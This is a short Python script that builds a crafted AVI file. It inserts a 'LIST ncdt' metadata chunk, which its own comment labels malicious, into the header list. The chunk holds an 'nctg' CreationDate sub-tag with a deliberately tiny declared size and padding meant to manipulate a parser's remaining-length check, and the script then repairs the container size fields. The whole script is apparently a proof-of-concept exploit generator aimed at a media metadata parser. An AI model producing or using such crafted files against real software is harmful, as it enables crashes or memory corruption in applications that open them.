import struct, sys

def read_chunks(data, start, end):
    """yield (fourcc, size, data_start, data_end, listtype_or_None) for top-level chunks in [start,end)"""
    pos = start
    out = []
    while pos + 8 <= end:
        fourcc = data[pos:pos+4]
        size = struct.unpack_from("<I", data, pos+4)[0]
        dstart = pos + 8
        dend = dstart + size
        listtype = None
        if fourcc == b'LIST' and size >= 4:
            listtype = data[dstart:dstart+4]
        out.append((fourcc, size, dstart, dend, listtype, pos))
        pos = dend + (size & 1)
    return out

src = sys.argv[1]
dst = sys.argv[2]
data = bytearray(open(src, 'rb').read())

assert data[0:4] == b'RIFF'
riff_size = struct.unpack_from("<I", data, 4)[0]
assert data[8:12] == b'AVI '

top = read_chunks(data, 12, 12 + riff_size - 4)
hdrl = None
for fourcc, size, dstart, dend, listtype, pos in top:
    if fourcc == b'LIST' and listtype == b'hdrl':
        hdrl = (pos, size, dstart, dend)
        break
assert hdrl, "no hdrl LIST found"
hdrl_pos, hdrl_size, hdrl_dstart, hdrl_dend = hdrl
print(f"hdrl at {hdrl_pos}, size={hdrl_size}, content=[{hdrl_dstart},{hdrl_dend})")

# Build malicious ncdt LIST chunk
value_byte = b'A'
sub_tag_size = struct.pack("<HH", 0x13, 1)  # sub_tag=0x13 (CreationDate), sub_size=1
nctg_payload = sub_tag_size + value_byte     # 5 bytes
assert len(nctg_payload) == 5
nctg_chunk = b'nctg' + struct.pack("<I", len(nctg_payload)) + nctg_payload  # 4+4+5=13
padding = b'\x00' * 13  # keep `left` comfortably > 19 after header consumption, and make total even
ncdt_content = nctg_chunk + padding  # 13+13=26
assert len(ncdt_content) % 2 == 0
ncdt_list = b'LIST' + struct.pack("<I", 4 + len(ncdt_content)) + b'ncdt' + ncdt_content
print(f"inserting {len(ncdt_list)} bytes")

# Insert right at the end of hdrl's content (before hdrl closes), update hdrl size and RIFF size
insert_at = hdrl_dend
new_data = data[:insert_at] + ncdt_list + data[insert_at:]

# patch hdrl's size field (at hdrl_pos+4)
new_hdrl_size = hdrl_size + len(ncdt_list)
struct.pack_into("<I", new_data, hdrl_pos + 4, new_hdrl_size)

# patch RIFF size field (at offset 4)
new_riff_size = riff_size + len(ncdt_list)
struct.pack_into("<I", new_data, 4, new_riff_size)

open(dst, 'wb').write(new_data)
print(f"wrote {dst}, {len(new_data)} bytes")
